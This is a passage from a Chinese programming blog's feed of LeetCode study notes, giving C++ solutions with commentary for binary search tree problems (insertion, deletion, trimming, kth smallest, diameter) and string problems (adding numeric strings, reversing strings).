class="built_in">lowestCommonAncestor</span>(root-&gt;right,p,q);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(root)&#123;</span><br><span class="line">            <span class="keyword">if</span>(root-&gt;val &gt; p-&gt;val &amp;&amp; root-&gt;val &gt; q-&gt;val)</span><br><span class="line">                root = root-&gt;left;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(root-&gt;val &lt; p-&gt;val &amp;&amp; root-&gt;val &lt; q-&gt;val)</span><br><span class="line">                root = root-&gt;right;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="701-二叉搜索树中的插入操作——插入一个结点"><a href="#701-二叉搜索树中的插入操作——插入一个结点" class="headerlink" title="701 二叉搜索树中的插入操作——插入一个结点"></a>701 二叉搜索树中的插入操作——插入一个结点</h3>注意，可能<strong>存在多种有效的插入方式</strong>，只要树在插入后仍保持为二叉搜索树即可。 你可以返回任意有效的结果。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">insert</span><span class="params">(TreeNode* root, <span class="keyword">int</span> val)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            TreeNode *node = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(val);</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(val &gt; root-&gt;val)&#123;</span><br><span class="line">            <span class="comment">//if(root-&gt;right)</span></span><br><span class="line">                root-&gt;right = <span class="built_in">insert</span>(root-&gt;right,val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(val &lt; root-&gt;val)&#123;</span><br><span class="line">            <span class="comment">//if(root-&gt;left)</span></span><br><span class="line">                root-&gt;left = <span class="built_in">insert</span>(root-&gt;left,val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">insertIntoBST</span><span class="params">(TreeNode* root, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">insert</span>(root,val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*=</span></span><br><span class="line"><span class="comment">    迭代</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">insertIntoBST</span><span class="params">(TreeNode* root, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            TreeNode *node = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(val);</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">        TreeNode *cur = root;</span><br><span class="line">        TreeNode *parent = root;</span><br><span class="line">        <span class="keyword">while</span>(cur)&#123;<span class="comment">//while寻找 插入位置</span></span><br><span class="line">            parent = cur;</span><br><span class="line">            <span class="keyword">if</span>(val &gt; cur-&gt;val)</span><br><span class="line">                cur = cur-&gt;right;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(val &lt; cur-&gt;val)</span><br><span class="line">                cur = cur-&gt;left;</span><br><span class="line">        &#125;</span><br><span class="line">        TreeNode *node = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(val);<span class="comment">//新建结点</span></span><br><span class="line">        <span class="keyword">if</span>(val &gt; parent-&gt;val)</span><br><span class="line">            parent-&gt;right = node;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            parent-&gt;left = node;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="450-删除二叉搜索树中的节点"><a href="#450-删除二叉搜索树中的节点" class="headerlink" title="450 删除二叉搜索树中的节点"></a>450 删除二叉搜索树中的节点</h2>给定一个二叉搜索树的根节点 root 和一个值 key，删除二叉搜索树中的 key 对应的节点，并保证二叉搜索树的性质不变。返回二叉搜索树（有可能被更新）的根节点的引用。</li></ul><p>一般来说，删除节点可分为两个步骤：</p><pre><code>首先找到需要删除的节点；如果找到了，删除它。</code></pre><p><strong>删除结点【五种情况】：</strong>被删结点的情况</p><ul><li>是叶子结点：直接删除即可</li><li>有左结点，无右结点：让其左节点替代自己</li><li>有右结点，无左结点：让其右节点替代自己</li><li>既有左结点，又有右结点：</li></ul><p><strong>法一：分五种情况</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">deleteNode</span><span class="params">(TreeNode* root, <span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span> root; <span class="comment">// 第一种情况：没找到删除的节点，遍历到空节点直接返回了</span></span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val == key) &#123;</span><br><span class="line">            <span class="comment">// 第二种情况：左右孩子都为空（叶子节点），直接删除节点， 返回NULL为根节点</span></span><br><span class="line">            <span class="keyword">if</span> (root-&gt;left == <span class="literal">nullptr</span> &amp;&amp; root-&gt;right == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                <span class="comment">///! 内存释放</span></span><br><span class="line">                <span class="keyword">delete</span> root;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 第三种情况：其左孩子为空，右孩子不为空，删除节点，右孩子补位 ，返回右孩子为根节点</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (root-&gt;left == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                <span class="keyword">auto</span> retNode = root-&gt;right;</span><br><span class="line">                <span class="comment">///! 内存释放</span></span><br><span class="line">                <span class="keyword">delete</span> root;</span><br><span class="line">                <span class="keyword">return</span> retNode;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 第四种情况：其右孩子为空，左孩子不为空，删除节点，左孩子补位，返回左孩子为根节点</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (root-&gt;right == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                <span class="keyword">auto</span> retNode = root-&gt;left;</span><br><span class="line">                <span class="comment">///! 内存释放</span></span><br><span class="line">                <span class="keyword">delete</span> root;</span><br><span class="line">                <span class="keyword">return</span> retNode;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 第五种情况：左右孩子节点都不为空，则将删除节点的左子树放到删除节点的右子树的最左面节点的左孩子的位置</span></span><br><span class="line">            <span class="comment">// 并返回删除节点右孩子为新的根节点。</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                TreeNode* cur = root-&gt;right; <span class="comment">// 找右子树最左面的节点</span></span><br><span class="line">                <span class="keyword">while</span>(cur-&gt;left != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                    cur = cur-&gt;left;</span><br><span class="line">                &#125;</span><br><span class="line">                cur-&gt;left = root-&gt;left; <span class="comment">// 把要删除的节点（root）左子树放在cur的左孩子的位置</span></span><br><span class="line">                TreeNode* tmp = root;   <span class="comment">// 把root节点保存一下，下面来删除</span></span><br><span class="line">                root = root-&gt;right;     <span class="comment">// 返回旧root的右孩子作为新root</span></span><br><span class="line">                <span class="keyword">delete</span> tmp;             <span class="comment">// 释放节点内存（这里不写也可以，但C++最好手动释放一下吧）</span></span><br><span class="line">                <span class="keyword">return</span> root;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val &gt; key) root-&gt;left = <span class="built_in">deleteNode</span>(root-&gt;left, key);</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val &lt; key) root-&gt;right = <span class="built_in">deleteNode</span>(root-&gt;right, key);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>法二：普通二叉树的删除方式</strong><br>（没有使用搜索树的特性，遍历整棵树），用交换值的操作来删除目标节点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">deleteNode</span><span class="params">(TreeNode* root, <span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span> root;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val == key) &#123;</span><br><span class="line">            <span class="keyword">if</span> (root-&gt;right == <span class="literal">nullptr</span>) &#123; <span class="comment">// 这里第二次操作目标值：最终删除的作用</span></span><br><span class="line">                <span class="keyword">return</span> root-&gt;left;</span><br><span class="line">            &#125;</span><br><span class="line">            TreeNode *cur = root-&gt;right;</span><br><span class="line">            <span class="keyword">while</span> (cur-&gt;left) &#123;</span><br><span class="line">                cur = cur-&gt;left;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">swap</span>(root-&gt;val, cur-&gt;val); <span class="comment">// 这里第一次操作目标值：交换目标值其右子树最左面节点。</span></span><br><span class="line">        &#125;</span><br><span class="line">        root-&gt;left = <span class="built_in">deleteNode</span>(root-&gt;left, key);</span><br><span class="line">        root-&gt;right = <span class="built_in">deleteNode</span>(root-&gt;right, key);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="669-修剪二叉搜索树"><a href="#669-修剪二叉搜索树" class="headerlink" title="669 修剪二叉搜索树"></a>669 修剪二叉搜索树</h2><p>给定一个二叉搜索树，同时给定最小边界L 和最大边界 R。通过修剪二叉搜索树，使得所有节点的值在[L, R]中 (R&gt;=L) 。你可能需要改变树的根节点，所以结果应当返回修剪好的二叉搜索树的新的根节点。【本题存在唯一答案】</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">trimBST</span><span class="params">(TreeNode* root, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span> ) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val &lt; low) &#123;</span><br><span class="line">            TreeNode* right = <span class="built_in">trimBST</span>(root-&gt;right, low, high); <span class="comment">// 寻找符合区间[low, high]的节点</span></span><br><span class="line">            <span class="keyword">return</span> right;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val &gt; high) &#123;</span><br><span class="line">            TreeNode* left = <span class="built_in">trimBST</span>(root-&gt;left, low, high); <span class="comment">// 寻找符合区间[low, high]的节点</span></span><br><span class="line">            <span class="keyword">return</span> left;</span><br><span class="line">        &#125;</span><br><span class="line">        root-&gt;left = <span class="built_in">trimBST</span>(root-&gt;left, low, high); <span class="comment">// root-&gt;left接入符合条件的左孩子</span></span><br><span class="line">        root-&gt;right = <span class="built_in">trimBST</span>(root-&gt;right, low, high); <span class="comment">// root-&gt;right接入符合条件的右孩子</span></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="543-二叉树的直径"><a href="#543-二叉树的直径" class="headerlink" title="543 二叉树的直径"></a>543 二叉树的直径</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    求最大深度 进阶版</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;<span class="comment">//全局遍历</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">depth</span><span class="params">(TreeNode* root)</span></span>&#123;<span class="comment">//某棵树的最大深度</span></span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> left_max = <span class="built_in">depth</span>(root-&gt;left);</span><br><span class="line">        <span class="keyword">int</span> right_max = <span class="built_in">depth</span>(root-&gt;right);</span><br><span class="line">        res = <span class="built_in">max</span>(res,left_max + right_max);<span class="comment">//重点</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(left_max , right_max)+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">diameterOfBinaryTree</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> root_max = <span class="built_in">depth</span>(root);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="230-二叉搜索树中第K小的元素"><a href="#230-二叉搜索树中第K小的元素" class="headerlink" title="230 二叉搜索树中第K小的元素"></a>230 二叉搜索树中第K小的元素</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  中序遍历</span></span><br><span class="line"><span class="comment">    第k小 [k-1]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">inorder</span><span class="params">(TreeNode *root,vector&lt;<span class="keyword">int</span>&gt;&amp; res)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">inorder</span>(root-&gt;left,res);</span><br><span class="line">        res.<span class="built_in">push_back</span>(root-&gt;val);<span class="comment">//装入序列</span></span><br><span class="line">        <span class="built_in">inorder</span>(root-&gt;right,res);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">kthSmallest</span><span class="params">(TreeNode* root, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="built_in">inorder</span>(root,res);</span><br><span class="line">        <span class="comment">//sort(res.begin(),res.end());</span></span><br><span class="line">        <span class="keyword">return</span> res[k<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="力扣刷题" scheme="https://xizhi-future.github.io/categories/%E5%8A%9B%E6%89%A3%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="力扣" scheme="https://xizhi-future.github.io/tags/%E5%8A%9B%E6%89%A3/"/>
    
  </entry>
  
  <entry>
    <title>五、字符串</title>
    <link href="https://xizhi-future.github.io/2025/12/03/%E4%BA%94%E3%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <id>https://xizhi-future.github.io/2025/12/03/%E4%BA%94%E3%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2/</id>
    <published>2025-12-03T06:13:06.000Z</published>
    <updated>2025-12-03T06:12:55.165Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="五、字符串"><a href="#五、字符串" class="headerlink" title="五、字符串"></a>五、字符串</h2><h3 id="415-字符串相加"><a href="#415-字符串相加" class="headerlink" title="415 字符串相加"></a>415 字符串相加</h3><p>给定【两个字符串形式】的【非负整数】 num1 和num2 ，计算它们的和并同样【以字符串形式返回】。<br>你不能使用任何內建的用于处理大整数的库（比如 BigInteger）， 也不能直接将输入的字符串转换为整数形式。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">addStrings</span><span class="params">(string num1, string num2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i=num1.<span class="built_in">size</span>()<span class="number">-1</span>,j=num2.<span class="built_in">size</span>()<span class="number">-1</span>,add=<span class="number">0</span>;</span><br><span class="line">        string ans = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&gt;=<span class="number">0</span> || j&gt;=<span class="number">0</span> || add!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> x = i&gt;=<span class="number">0</span> ? num1[i] - <span class="string">&#x27;0&#x27;</span> : <span class="number">0</span>;<span class="comment">//加0和减0 是为了间接将 字符转为整数进行运算</span></span><br><span class="line">            <span class="keyword">int</span> y = j&gt;=<span class="number">0</span> ? num2[j] - <span class="string">&#x27;0&#x27;</span> : <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> res = x+y+add;</span><br><span class="line">            ans.<span class="built_in">push_back</span>(<span class="string">&#x27;0&#x27;</span> + res%<span class="number">10</span>);<span class="comment">//余数</span></span><br><span class="line">            add = res/<span class="number">10</span>;  <span class="comment">//商，进位</span></span><br><span class="line">            i -= <span class="number">1</span>;</span><br><span class="line">            j -= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">reverse</span>(ans.<span class="built_in">begin</span>(),ans.<span class="built_in">end</span>());<span class="comment">//字符串反转</span></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="344-反转字符串"><a href="#344-反转字符串" class="headerlink" title="344 反转字符串"></a>344 反转字符串</h3><p>编写一个函数，其作用是将输入的字符串反转过来。输入字符串以字符数组 s 的形式给出。<br>不要给另外的数组分配额外的空间，你必须<strong>原地修改</strong>输入数组、使用 O(1) 的额外空间解决这一问题。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//双指针 swap()</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">reverseString</span><span class="params">(vector&lt;<span class="keyword">char</span>&gt;&amp; s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len=s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>,j=len<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;=j)&#123;<span class="comment">//i&lt;j也可&gt;</span></span><br><span class="line">            <span class="built_in">swap</span>(s[i],s[j]);</span><br><span class="line">            i++;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="541-反转字符串-II——每2k字符，反转前k个字符"><a href="#541-反转字符串-II——每2k字符，反转前k个字符" class="headerlink" title="541 反转字符串 II——每2k字符，反转前k个字符"></a>541 反转字符串 II——每2k字符，反转前k个字符</h3><p>给定一个字符串 s 和一个整数 k，从字符串开头算起，每计数至 2k 个字符，就【反转这 2k 字符中的前 k 个字符】。</p><ul><li>如果剩余字符少于 k 个，则将剩余字符全部反转。</li><li>如果剩余字符小于 2k 但大于或等于 k 个，则反转前 k 个字符，其余字符保持原样。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    模拟：反转每个下标从 2k 的倍数开始的，长度为 k 的子串。若【子串长度不足 k，则反转整个子串】</span></span><br><span class="line"><span class="comment">    min(i+k-1,n-1)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">reverseS</span><span class="params">(string &amp;s,<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">            <span class="built_in">swap</span>(s[i],s[j]);</span><br><span class="line">            i++;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">reverseStr</span><span class="params">(string s, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i+=<span class="number">2</span>*k)&#123;</span><br><span class="line">            <span class="built_in">reverseS</span>(s,i,<span class="built_in">min</span>(i+k<span class="number">-1</span>,n<span class="number">-1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">reverseStr</span><span class="params">(string s, <span class="keyword">int</span> 